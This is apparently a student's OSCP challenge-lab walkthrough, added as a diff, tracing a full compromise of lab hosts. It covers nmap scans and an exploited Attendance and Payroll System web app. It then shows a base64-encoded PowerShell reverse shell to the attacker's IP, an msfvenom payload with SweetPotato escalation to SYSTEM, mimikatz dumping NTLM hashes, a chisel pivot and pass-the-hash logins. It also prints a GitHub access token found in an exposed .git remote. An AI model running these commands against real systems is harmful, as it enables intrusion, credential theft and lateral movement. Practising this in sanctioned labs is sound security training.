@@ -1,0 +1,930 @@
+OSCPA first part
+
+OSCPA
+Scan the 4 IPs IPs that are externals, the other 2 IPs are internal
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.230.141 192.168.230.143-145
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 17:00 CET
+Nmap scan report for 192.168.230.141
+Host is up (0.052s latency).
+Not shown: 993 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
+|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
+|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
+80/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
+|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
+|_http-title: Home
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-generator: Nicepage 4.8.2, nicepage.com
+81/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
+|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
+|_http-title: Attendance and Payroll System
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3306/tcp open  mysql         MySQL (unauthorized)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=11/24%OT=22%CT=1%CU=44337%PV=Y%DS=4%DC=T%G=Y%TM=674
+OS:34E67%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=I%TS=U)SEQ(SP=10
+OS:6%GCD=1%ISR=10D%TI=I%TS=U)SEQ(SP=106%GCD=1%ISR=10E%TI=I%TS=U)OPS(O1=M551
+OS:NW8NNS%O2=M551NW8NNS%O3=M551NW8%O4=M551NW8NNS%O5=M551NW8NNS%O6=M551NNS)W
+OS:IN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=F
+OS:FFF%O=M551NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T
+OS:3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N
+OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=4EFB%RUD=G)IE(R
+OS:=N)
+
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-11-24T16:02:58
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: 1s
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   55.09 ms 192.168.45.1
+2   63.95 ms 192.168.45.254
+3   64.11 ms 192.168.251.1
+4   64.25 ms 192.168.230.141
+
+Nmap scan report for 192.168.230.143
+Host is up (0.053s latency).
+Not shown: 990 filtered tcp ports (no-response)
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
+|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
+|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
+80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Test Page for the Nginx HTTP Server on Fedora
+443/tcp  open  http       Apache httpd 2.4.41
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  ppp?
+3001/tcp open  nessus?
+3003/tcp open  cgms?
+3306/tcp open  mysql      MySQL (unauthorized)
+5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
+| ssl-cert: Subject: commonName=aero
+| Subject Alternative Name: DNS:aero
+| Not valid before: 2021-05-10T22:20:48
+|_Not valid after:  2031-05-08T22:20:48
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   SMBProgNeg: 
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
+|     Fpostmaster.c
+|     L2113
+|_    RProcessStartupPacket
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port3003-TCP:V=7.94SVN%I=7%D=11/24%Time=67434DA4%P=x86_64-pc-linux-gnu%
+SF:r(GenericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTS
+SF:PRequest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServe
+SF:rCookie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDStr
+SF:ing,1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5432-TCP:V=7.94SVN%I=7%D=11/24%Time=67434D9F%P=x86_64-pc-linux-gnu%
+SF:r(SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fro
+SF:ntend\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\
+SF:x203\.0\0Fpostmaster\.c\0L2113\0RProcessStartupPacket\0\0");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 4 hops
+Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+-   Hops 1-3 are the same as for 192.168.230.141
+4   55.25 ms 192.168.230.143
+
+Nmap scan report for 192.168.230.144
+Host is up (0.053s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
+|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-git: 
+|   192.168.230.144:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Last commit message: Security Update 
+|     Remotes:
+|_      https://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@github.com/PWK-Challenge-Lab/dev.git
+|_http-generator: Nicepage 4.21.12, nicepage.com
+|_http-title: Home
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=11/24%OT=21%CT=1%CU=42771%PV=Y%DS=4%DC=T%G=Y%TM=674
+OS:34E67%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%II=I%TS=A)OPS(O
+OS:1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11N
+OS:W7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
+OS:=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
+OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+OS:Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
+OS:=5516%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+-   Hops 1-3 are the same as for 192.168.230.141
+4   64.11 ms 192.168.230.144
+
+Nmap scan report for 192.168.230.145
+Host is up (0.052s latency).
+Not shown: 994 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Samuel's Personal Site
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-11-24T16:03:37+00:00; +2s from scanner time.
+| ssl-cert: Subject: commonName=oscp
+| Not valid before: 2024-06-28T19:12:50
+|_Not valid after:  2024-12-28T19:12:50
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: oscp
+|   DNS_Computer_Name: oscp
+|   Product_Version: 10.0.19041
+|_  System_Time: 2024-11-24T16:03:00+00:00
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows XP (89%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp3
+Aggressive OS guesses: Microsoft Windows XP SP3 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-11-24T16:03:07
+|_  start_date: N/A
+|_clock-skew: mean: 1s, deviation: 0s, median: 1s
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+-   Hops 1-3 are the same as for 192.168.230.141
+4   55.86 ms 192.168.230.145
+
+Post-scan script results:
+| clock-skew: 
+|   1s: 
+|     192.168.230.141
+|_    192.168.230.145
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 4 IP addresses (4 hosts up) scanned in 212.64 seconds
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~]
+└─$ 
+#.141 port 81 have the Attendance and Payroll System, Therefore I search for the vulnerability with searchsploit
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Attendance and Payroll System                      
+------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                               |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Attendance and Payroll System v1.0 - Remote Code Execution (RCE)                                                                                             | php/webapps/50801.py
+Attendance and Payroll System v1.0 - SQLi Authentication Bypass                                                                                              | php/webapps/50802.py
+------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+#We go for the first on, we first modify the exploit to fit our directory part which we found after fuzzing and bruteforcing directory with fuzz and gobuster
+gobuster dir -u 192.168.230.141:81 -w /usr/share/wordlists/dirb/common.txt -t5
+ffuf -w /usr/share/wordlists/wfuzz/general/megabeast.txt -u http://192.168.230.141:81/FUZZ
+
+Changes in the shellcode
+upload_path = '/apsystem/admin/employee_edit_photo.php'
+shell_path = '/apsystem/images/shell.php'
+to
+upload_path = '/admin/employee_edit_photo.php'
+shell_path = '/images/shell.php'
+
+I got a remote shell on the .141 Target
+──(kali㉿kali)-[~/oscpa]
+└─$ python3 50801.py http://192.168.230.141:81
+
+    >> Attendance and Payroll System v1.0
+    >> Unauthenticated Remote Code Execution
+    >> By pr0z
+
+[*] Uploading the web shell to http://192.168.230.141:81
+[*] Validating the shell has been uploaded to http://192.168.230.141:81
+[✓] Successfully connected to web shell
+
+RCE > 
+
+Because the shell is not interative, I have to use reverse shell oneliner to get another shell in another window, I used a kali powershell window to construct the code.
+┌──(kali㉿kali)-[~]
+└─$ pwsh
+PowerShell 7.2.6
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.154",4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                                                                                                            ┌──(kali㉿kali)-[/home/kali]                                                         └─PS> $EncodedText =[Convert]::ToBase64String($Bytes)                                                                                                                     ┌──(kali㉿kali)-[/home/kali]                                                         └─PS> $EncodedText                                                                   JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA0ACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> exit 
+
+Paste it on the shell and execute it
+RCE > powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA0ACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+Then got a reverse shell in another window
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4443
+listening on [any] 4443 ...
+connect to [192.168.45.154] from (UNKNOWN) [192.168.230.141] 63957
+whoami
+ms01\mary.williams
+PS C:\wamp64\attendance\images> hostname
+MS01
+PS C:\wamp64\attendance\images> 
+
+I noticed I have seimpersonation privilege enabled
+PS C:\wamp64\attendance\images> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+PS C:\wamp64\attendance\images>
+
+I also noticed that celia.almeda have a session on the server
+ Directory: C:\users
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         3/25/2022   1:08 PM                Administrator                                                        
+d-----        11/10/2022   2:06 AM                Administrator.OSCP                                                   
+d-----          4/1/2022   9:30 AM                celia.almeda                                                         
+d-----          4/1/2022   7:56 AM                Mary.Williams                                                        
+d-r---        11/18/2020  11:48 PM                Public                                                               
+d-----         12/5/2022   5:47 AM                support                                                              
+d-----        11/13/2022  11:23 PM                web_svc                                                     
+
+I used sweetpotatoe and msfenom reverse shellcode to elevete my privilege to nt/authority
+──(kali㉿kali)-[~/oscpa]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.154 lport=444 -f exe -o met.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: met.exe
+
+iwr -uri http://192.168.45.154:8000/SweetPotato.exe -Outfile SweetPotato.exe
+iwr -uri http://192.168.45.154:8000/met.exe -Outfile met.exe
+
+#executing sweet potato to get a shell as nt authority
+PS C:\users\mary.williams> .\SweetPotato.exe -p met.exe
+
+──(kali㉿kali)-[~]
+└─$ nc -nvlp 444
+listening on [any] 444 ...
+connect to [192.168.45.154] from (UNKNOWN) [192.168.230.141] 63968
+Microsoft Windows [Version 10.0.19044.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+MS01
+
+C:\Windows\system32>
+
+For further domain enumeration, I transfered PowerView.ps1, mimikatz.exe and sharphound.ps1
+
+Syntax for sharphound 
+transfer to target
+import-module .\sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\username\Desktop\ -OutputPrefix "anyname"
+Transfer the output to kali
+
+iwr -uri http://192.168.45.154:8000/mimikatz.exe -Outfile mimikatz.exe
+
+Result of enumeration from with powerview
+
+PS C:\Users\Administrator> Get-NetDomain
+Get-NetDomain
+
+
+Forest                  : oscp.exam
+DomainControllers       : {DC01.oscp.exam}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : 
+PdcRoleOwner            : DC01.oscp.exam
+RidRoleOwner            : DC01.oscp.exam
+InfrastructureRoleOwner : DC01.oscp.exam
+Name                    : oscp.exam
+
+PS C:\Users\Administrator> Get-NetUser | select displayname,userprincipalname                    
+Get-NetUser | select displayname,userprincipalname
+
+displayname     userprincipalname        
+-----------     -----------------        
+                                         
+                                         
+                                         
+Celia Almeda    celia.almeda@oscp.exam   
+Tom Kinney      tom.kinney@oscp.exam     
+Tom Admin       tom_admin@oscp.exam      
+Leonard Morris  Leonard.Morris@oscp.exam 
+Sandra Craig    Sandra.Craig@oscp.exam   
+Chelsea Byrne   Chelsea.Byrne@oscp.exam  
+Luke Martin     Luke.Martin@oscp.exam    
+Donna Johnson   Donna.Johnson@oscp.exam  
+Lawrence Kay    Lawrence.Kay@oscp.exam   
+Emily Bishop    Emily.Bishop@oscp.exam   
+Linda Patel     Linda.Patel@oscp.exam    
+Jamie Thomas    Jamie.Thomas@oscp.exam   
+Shane Mitchell  Shane.Mitchell@oscp.exam 
+Frank Farrell   Frank.Farrell@oscp.exam  
+Jane Booth      Jane.Booth@oscp.exam     
+Joan North      Joan.North@oscp.exam     
+Carol Webb      Carol.Webb@oscp.exam     
+Kenneth Coles   Kenneth.Coles@oscp.exam  
+Oliver Gray     Oliver.Gray@oscp.exam    
+Georgina Begum  Georgina.Begum@oscp.exam 
+Aimee Hunt      Aimee.Hunt@oscp.exam     
+Thomas Robinson Thomas.Robinson@oscp.exam
+Janice Turner   Janice.Turner@oscp.exam  
+sql_svc         sql_svc@oscp.exam        
+John Dorian     john.dorian@oscp.exam    
+web_svc         web_svc@oscp.exam  
+
+#Enumeration with mimikatz
+PS C:\Users\Administrator> .\mimikatz.exe
+.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 389355 (00000000:0005f0eb)
+Session           : Interactive from 1
+User Name         : celia.almeda
+Domain            : OSCP
+Logon Server      : DC01
+Logon Time        : 6/26/2024 7:45:03 PM
+SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
+        msv :
+         [00000003] Primary
+         * Username : celia.almeda
+         * Domain   : OSCP
+         * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
+         * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
+         * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f
+        tspkg :
+        wdigest :
+         * Username : celia.almeda
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : celia.almeda
+         * Domain   : OSCP.EXAM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 141319 (00000000:00022807)
+Session           : Service from 0
+User Name         : Mary.Williams
+Domain            : MS01
+Logon Server      : MS01
+Logon Time        : 6/26/2024 7:44:50 PM
+SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
+        msv :
+         [00000003] Primary
+         * Username : Mary.Williams
+         * Domain   : MS01
+         * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
+         * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
+        tspkg :
+        wdigest :
+         * Username : Mary.Williams
+         * Domain   : MS01
+         * Password : (null)
+        kerberos :
+         * Username : Mary.Williams
+         * Domain   : MS01
+
+
+Got ntlm hash for Mary.Williams and  celia.almeda
+
+To test it on the internal network, I need to pivot with chisel on the compromised machine
+
+iwr -uri http://192.168.45.154:8000/chisel.exe -Outfile chisel.exe
+
+On windows
+PS C:\Users\Administrator> .\chisel.exe client 192.168.45.154:8080 R:socks
+.\chisel.exe client 192.168.45.154:8080 R:socks                                      
+2024/11/24 09:49:27 client: Connecting to ws://192.168.45.154:8080                   
+2024/11/24 09:49:40 client: Connection error: dial tcp 192.168.45.154:8080: connectex: No connection could be made because the target machine actively refused it.        
+2024/11/24 09:49:40 client: Retrying in 100ms...
+2024/11/24 09:49:42 client: Connected (Latency 49.0007ms)
+
+On Linux
+┌──(kali㉿kali)-[~/oscpa]
+└─$ ./chisel_linux server -p 8080 --reverse
+2024/11/24 18:49:41 server: Reverse tunnelling enabled
+2024/11/24 18:49:41 server: Fingerprint /xnCexVv+SFSmoHcxr2FojZEvovHoRnARKBU/BSy1lQ=
+2024/11/24 18:49:41 server: Listening on http://0.0.0.0:8080
+2024/11/24 18:49:42 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ cat username.txt
+celia.almeda   
+tom.kinney     
+tom_admin      
+Leonard.Morris 
+Sandra.Craig   
+Chelsea.Byrne  
+Luke.Martin    
+Donna.Johnson  
+Lawrence.Kay   
+Emily.Bishop   
+Linda.Patel    
+Jamie.Thomas
+Shane.Mitchell 
+Frank.Farrell  
+Jane.Booth     
+Joan.North     
+Carol.Webb     
+Kenneth.Coles  
+Oliver.Gray
+Georgina.Begum 
+Aimee.Hunt
+Thomas.Robinson
+Janice.Turner  
+sql_svc
+john.dorian
+web_svc
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/oscpa]
+└─$ cat hashes.hash 
+e728ecbadfb02f51ce8eed753f3ff3fd
+9a3121977ee93af56ebd0ef4f527a35e
+  
+  Tried netexec with winrm and it worked for user [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!) on machine 10.10.190.142 
+  ──(kali㉿kali)-[~/oscpa]
+└─$ proxychains -q netexec winrm 10.10.190.140 10.10.190.142 -u username.txt --hash hashes.hash                       
+WINRM       10.10.190.142   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
+WINRM       10.10.190.140   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.190.142   5985   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
